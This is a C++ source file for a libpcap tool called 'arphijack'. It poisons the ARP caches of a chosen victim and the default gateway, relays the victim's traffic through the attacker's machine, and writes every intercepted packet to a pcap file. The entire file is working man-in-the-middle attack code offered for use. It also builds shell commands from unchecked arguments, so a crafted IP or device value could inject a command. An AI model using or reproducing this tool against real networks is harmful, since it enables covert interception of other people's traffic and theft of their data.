#include <cstdlib>
#include <cstring>
#include <string>
#include <map>
#include <vector>

#include <pcap.h>
#include <net/ethernet.h>
#include <arpa/inet.h>

using namespace std;

#define MY_ASSERT(expr) \
    if (!(expr)) \
    { \
        printf("Assertion failed: %s\n", #expr); \
        return EXIT_FAILURE; \
    }

#define COPY_OR_ZERO(dest, src, len) \
    if (src) \
        memcpy(dest, src, len); \
    else \
        memset(dest, 0, len);

namespace
{
	const unsigned int kSnapLen = 65535;

    char    g_szLastErr[PCAP_ERRBUF_SIZE] = {0};
    string	g_strFilename;
};

typedef struct _WorkingSet
{
    pcap_t* 		handle;
    u_char  		myMAC[ETH_ALEN];
    u_char  		victimMAC[ETH_ALEN];
    u_char  		gatewayMAC[ETH_ALEN];
    in_addr 		victimIP;
    in_addr 		gatewayIP;
} WorkingSet;

typedef struct
{
    u_int16_t   hardwareType;		    /* Format of hardware address.  */
    u_int16_t   protocolType;		    /* Format of protocol address.  */
    u_int8_t    hardwareSize;		    /* Length of hardware address.  */
    u_int8_t    protocolSize;		    /* Length of protocol address.  */
    u_int16_t   opcode;		            /* ARP opcode (command).  */
    u_int8_t    senderMAC[ETH_ALEN];	/* Sender hardware address.  */
    u_int16_t   senderIP[2];		    /* Sender IP address.  */ 
    u_int8_t    targetMAC[ETH_ALEN];	/* Target hardware address.  */
    u_int16_t   targetIP[2];		    /* Target IP address.  */
} ARPPacket;

#ifndef pcap_hdr_t
typedef struct pcap_hdr_s
{
	unsigned int 	magic_number;   /* magic number */
	u_int16_t	 	version_major;  /* major version number */
	u_int16_t	 	version_minor;  /* minor version number */
	int		  	 	thiszone;       /* GMT to local correction */
	unsigned int 	sigfigs;        /* accuracy of timestamps */
	unsigned int 	snaplen;        /* max length of captured packets, in octets */
	unsigned int 	network;        /* data link type */
} pcap_hdr_t;
#endif

#ifndef pcaprec_hdr_t
typedef struct pcaprec_hdr_s
{
    unsigned int 	ts_sec;         /* timestamp seconds */
    unsigned int 	ts_usec;        /* timestamp microseconds */
    unsigned int 	incl_len;       /* number of octets of packet saved in file */
    unsigned int 	orig_len;       /* actual length of packet */
} pcaprec_hdr_t;
#endif

#define MAC_FORMAT "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx"

inline void mac_aton(const char* str, u_char mac[ETH_ALEN])
{
    sscanf(str, MAC_FORMAT, &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}

inline void mac_ntoa(const u_char mac[ETH_ALEN], char* str)
{
    sprintf(str, MAC_FORMAT, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

#define GREP_MAC "grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'"

int GetMACFromConsoleOutput(const char* cmd, u_char macAddr[ETH_ALEN])
{
    char cmdWithGrep[100] = {0};
    sprintf(cmdWithGrep, "%s | %s", cmd, GREP_MAC);
    
    FILE* pPipe = popen(cmdWithGrep, "r");
    MY_ASSERT(pPipe);
    
    char pEntryBuf[19] = {0};
    if (fgets(pEntryBuf, sizeof(pEntryBuf)-1, pPipe))
        mac_aton(pEntryBuf, macAddr);
    
    pclose(pPipe);
    return 0;
}

typedef map< string, vector<u_char> > arp_map_t;

int GetMACForIP(const char* ip, u_char macAddr[ETH_ALEN])
{
    static arp_map_t mapARPCache;
    
    arp_map_t::const_iterator it = mapARPCache.find(ip);
    if (it != mapARPCache.end())
    {
        memcpy(macAddr, &(it->second.front()), ETH_ALEN * sizeof(u_char));
        return 0;
    }
    
    //This is to make sure there will be ARP entry for the IP
    char cmd[100] = {0};
    sprintf(cmd, "ping -c1 %s > NIL", ip);
    system(cmd);

    memset(cmd, 0, sizeof(cmd));
    sprintf(cmd, "arp -a -n | grep %s", ip);
    int nRet = GetMACFromConsoleOutput(cmd, macAddr);
    
    mapARPCache[ip].resize(ETH_ALEN);
    memcpy(&(mapARPCache[ip].front()), macAddr, ETH_ALEN * sizeof(u_char));
    return 0;
}

int GetMACForDevice(const char* dev, u_char macAddr[ETH_ALEN])
{
    char cmd[100] = {0};
    sprintf(cmd, "ifconfig %s | grep %s", dev, dev);
    return GetMACFromConsoleOutput(cmd, macAddr);
}

int GetDefaultGateway(in_addr* pGatewayAddr)
{
    FILE* pPipe = popen("/sbin/ip route | awk '/default/ {print $3}'", "r");
    MY_ASSERT(pPipe);
    
    char pIPAddrBuf[16] = {0};
    if (fgets(pIPAddrBuf, sizeof(pIPAddrBuf)-1, pPipe))
        inet_aton(pIPAddrBuf, pGatewayAddr);
    
    pclose(pPipe);
    return 0;
}

void WriteARP(u_char* pPacket,
              unsigned int& nPos,
              bool bRequest,
              const u_char pSenderMAC[ETH_ALEN],
              const in_addr& addrSenderIP,
              const u_char pTargetMAC[ETH_ALEN],
              const in_addr& addrTargetIP)
{
    ARPPacket* pARP = reinterpret_cast<ARPPacket*>(pPacket+nPos);
    
    pARP->hardwareType  = htons(0x0001);
    pARP->protocolType  = htons(0x0800);
    pARP->hardwareSize  = 0x06;
    pARP->protocolSize  = 0x04;
    pARP->opcode        = htons(bRequest?0x0001:0x0002);
    
    COPY_OR_ZERO(pARP->senderMAC, pSenderMAC, ETH_ALEN * sizeof(u_char));
    memcpy(pARP->senderIP, &addrSenderIP, sizeof(in_addr));
    
    COPY_OR_ZERO(pARP->targetMAC, pTargetMAC, ETH_ALEN * sizeof(u_char));
    memcpy(pARP->targetIP, &addrTargetIP, sizeof(in_addr));
    
    nPos += sizeof(ARPPacket);
}             
    
void WriteEthernet(u_char* pPacket,
                   unsigned int& nPos,
                   const u_char pSrc[ETH_ALEN],
                   const u_char pDst[ETH_ALEN])
{
    ether_header* pEth = reinterpret_cast<ether_header*>(pPacket+nPos);
    
    COPY_OR_ZERO(pEth->ether_dhost, pDst, ETH_ALEN * sizeof(u_char));
    COPY_OR_ZERO(pEth->ether_shost, pSrc, ETH_ALEN * sizeof(u_char));
    pEth->ether_type = htons(ETHERTYPE_ARP);
    
    nPos += sizeof(ether_header);
}

void HandleIPPacket(WorkingSet& ws,
					const u_char* pPacket,
					unsigned long uPacketLen)
{
    u_char pModPacket[uPacketLen];
    memcpy(pModPacket, pPacket, uPacketLen);
    ether_header* pEth = reinterpret_cast<ether_header*>(pModPacket);
    
    if (memcmp(pEth->ether_shost, ws.gatewayMAC, ETH_ALEN) == 0)
    {
        printf("[IP]  gateway -> victim\n");
        COPY_OR_ZERO(pEth->ether_dhost, ws.victimMAC, ETH_ALEN);
    }
    else
    {
        printf("[IP]  victim  -> gateway\n");
        COPY_OR_ZERO(pEth->ether_dhost, ws.gatewayMAC, ETH_ALEN);
    }
      
    COPY_OR_ZERO(pEth->ether_shost, ws.myMAC, ETH_ALEN * sizeof(u_char));
    
    pcap_inject(ws.handle, reinterpret_cast<void*>(pModPacket), uPacketLen);
}

bool IsARPPacket(const u_char* pPacket)
{
    const ether_header* pEth = reinterpret_cast<const ether_header*>(pPacket);
    return (ntohs(pEth->ether_type) == ETHERTYPE_ARP);
}

int CreateARPPacket(WorkingSet& ws,
                    bool bRequest,
                    const u_char pSenderMAC[ETH_ALEN],
                    const in_addr& addrSenderIP,
                    const u_char pTargetMAC[ETH_ALEN],
                    const in_addr& addrTargetIP,
                    u_char** pOutPacket, uint16_t& uOutPacketSize)
{
    try
    {
        u_int16_t uPacketSize = sizeof(ether_header) + sizeof(ARPPacket);
        u_char* pPacket = new u_char[uPacketSize+1];
        MY_ASSERT(pPacket);
        memset(pPacket, 0, (uPacketSize+1) * sizeof(u_char));
        
        unsigned int nOutPos=0;
        
        WriteEthernet(pPacket, nOutPos,
                      ws.myMAC,
                      pTargetMAC);
        
        WriteARP(pPacket, nOutPos,
                 bRequest,
                 pSenderMAC,
                 addrSenderIP,
                 pTargetMAC,
                 addrTargetIP);
                 
        *pOutPacket = pPacket;
        uOutPacketSize = uPacketSize;
    }
    catch (...)
    {
        printf("Exception occurred in %s\n", __FUNCTION__);
        return -2;
    }
}

int InjectARPPacket(WorkingSet& ws,
                    bool bRequest,
                    const u_char pSenderMAC[ETH_ALEN],
                    const in_addr& addrSenderIP,
                    const u_char pTargetMAC[ETH_ALEN],
                    const in_addr& addrTargetIP)
{
    u_char* pARPPacket = NULL;
    u_int16_t uPacketSize = 0;
    CreateARPPacket(ws, bRequest, pSenderMAC, addrSenderIP, pTargetMAC, addrTargetIP, &pARPPacket, uPacketSize);
    
    pcap_inject(ws.handle, reinterpret_cast<void*>(pARPPacket), uPacketSize);
}

inline int ClaimIPAsOwn(WorkingSet& ws,
                        const in_addr& addrIPToClaim,
                        const in_addr& addrDestIP,
                        u_char destMac[ETH_ALEN])
{
    return InjectARPPacket(ws, false, ws.myMAC, addrIPToClaim, destMac, addrDestIP);
}

inline void CreatePacketFilter(const WorkingSet& ws, string& filter)
{
	filter = "host ";
	filter += inet_ntoa(ws.victimIP);
	filter += " or host ";
	filter += inet_ntoa(ws.gatewayIP);
}

int HandleARPPacket(WorkingSet& ws, const u_char* pPacket)
{
	const ARPPacket* pARPPacket = reinterpret_cast<const ARPPacket*>(pPacket + sizeof(ether_header));
	
	in_addr tmp;
	memcpy(&tmp, pARPPacket->targetIP, sizeof(in_addr));
	char* szPacketIP = inet_ntoa(tmp);
	
	if (strcmp(inet_ntoa(ws.gatewayIP), szPacketIP) == 0)
	{
		printf("[ARP] Victim: who is gateway?\n");
		return ClaimIPAsOwn(ws, ws.gatewayIP, ws.victimIP, ws.victimMAC);
	}
	else if (strcmp(inet_ntoa(ws.victimIP), szPacketIP) == 0)
	{
		printf("[ARP] Gateway: who is victim?\n");
		return ClaimIPAsOwn(ws, ws.victimIP, ws.gatewayIP, ws.gatewayMAC); 
	}
}

int SavePacket(const pcap_pkthdr* pHeader, const u_char* pPacket)
{
   	FILE* pFile = fopen(g_strFilename.c_str(), "a");
   	MY_ASSERT(pFile);
	
	pcaprec_hdr_t packetHeader;
	packetHeader.ts_sec 	= pHeader->ts.tv_sec;
	packetHeader.ts_usec 	= pHeader->ts.tv_usec;
	packetHeader.incl_len 	= min(pHeader->caplen, kSnapLen);
	packetHeader.orig_len 	= pHeader->len;
	
	fwrite(reinterpret_cast<const char*>(&packetHeader), 1, sizeof(packetHeader), pFile);
	fwrite(reinterpret_cast<const char*>(pPacket), 1, pHeader->caplen, pFile);
	
	fclose(pFile);
	
	return 0;
}

int WriteGlobalHeader(FILE* pFile)
{
	MY_ASSERT(pFile);
	
	pcap_hdr_t globalHeader;
	globalHeader.magic_number 	= 0xa1b2c3d4;
	globalHeader.version_major 	= 2;
	globalHeader.version_minor	= 4;
	globalHeader.thiszone		= 0;
	globalHeader.sigfigs		= 0;
	globalHeader.snaplen		= kSnapLen;
	globalHeader.network		= 1; //Ethernet
	
	fwrite(reinterpret_cast<const char*>(&globalHeader), 1, sizeof(globalHeader), pFile);
	
	return 0;
}

void OnPacketArrival(u_char* args, const pcap_pkthdr* pHeader, const u_char* pPacket)
{
    WorkingSet* pWs = reinterpret_cast<WorkingSet*>(args);
    
    if (IsARPPacket(pPacket))
    {
        HandleARPPacket(*pWs, pPacket); 
    }
    else
    {
    	HandleIPPacket(*pWs, pPacket, pHeader->caplen);
    }
    
    SavePacket(pHeader, pPacket);
}

void PrintInstructions()
{
    printf("Usage: arphijack [victim-ip] [options]\n");
    printf("Options:\n");
    printf("-d --device [dev]\n");
    printf("  Listen to the [dev]. If not specified, will listen to a device with traffic.\n");
    printf("-o --output [filename]\n");
    printf("  Writes dump to [filename]. If not specified, will write to <dev>_<start-time>.pcap\n");
    printf("-g --gateway [ip-addr]\n");
    printf("  Treat [ip-addr] as the gateway. If not specified, will try to auto-detect.\n");
}

int main(int argc, char** argv)
{
	if (argc < 2)
	{
		PrintInstructions();
		return EXIT_FAILURE;
	}

    WorkingSet ws;
    memset(&ws, 0, sizeof(WorkingSet));
    
    inet_aton(argv[1], &(ws.victimIP));
    printf("Victim: %s\n", inet_ntoa(ws.victimIP));
    
    const char* szDevice   = NULL;
    
    for (uint8_t i=2; i<argc; i++)
    {
        if (strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--device") == 0)
            szDevice = argv[++i];
            
        if (strcmp(argv[i], "-o") == 0 || strcmp(argv[i], "--output") == 0)
            g_strFilename = argv[++i];
    }

    if (!szDevice)
        szDevice = pcap_lookupdev(g_szLastErr);
        
    MY_ASSERT(szDevice);
    printf("Listening on %s\n", szDevice);
    
    GetDefaultGateway(&(ws.gatewayIP));
    GetMACForIP(inet_ntoa(ws.gatewayIP), ws.gatewayMAC);
    printf("Default Gateway: %s\n", inet_ntoa(ws.gatewayIP));
    
    bpf_u_int32 net;
    bpf_u_int32 mask;
    MY_ASSERT(pcap_lookupnet(szDevice, &net, &mask, g_szLastErr) != -1);
    
    ws.handle = pcap_open_live(szDevice, BUFSIZ, 1, -1, g_szLastErr);
    MY_ASSERT(ws.handle);
    
    GetMACForIP(inet_ntoa(ws.victimIP), ws.victimMAC);
    
    char macAddrStr[18] = {0};
    mac_ntoa(ws.victimMAC, macAddrStr);
    printf("victim MAC address=[%s]\n", macAddrStr);
    
    GetMACForDevice(szDevice, ws.myMAC);
    
    char myMACStr[18] = {0};
    mac_ntoa(ws.myMAC, myMACStr);
    printf("my MAC address=[%s]\n", myMACStr);
    
    string filter;
    CreatePacketFilter(ws, filter);
    
    bpf_program fp;
    MY_ASSERT(pcap_compile(ws.handle, &fp, filter.c_str(), 0, net) != -1);
    
    MY_ASSERT(pcap_setfilter(ws.handle, &fp) != -1);
    
    if (g_strFilename.empty())
    	g_strFilename = "capture.pcap";
    	
   	FILE* pFile = fopen(g_strFilename.c_str(), "w");
   	MY_ASSERT(pFile);
    WriteGlobalHeader(pFile);
    fclose(pFile);
    
    ClaimIPAsOwn(ws, ws.gatewayIP, ws.victimIP, ws.victimMAC);
    ClaimIPAsOwn(ws, ws.victimIP, ws.gatewayIP, ws.gatewayMAC);
    MY_ASSERT(pcap_loop(ws.handle, -1, OnPacketArrival, reinterpret_cast<u_char*>(&ws)) != -1);
    
    return 0;
}

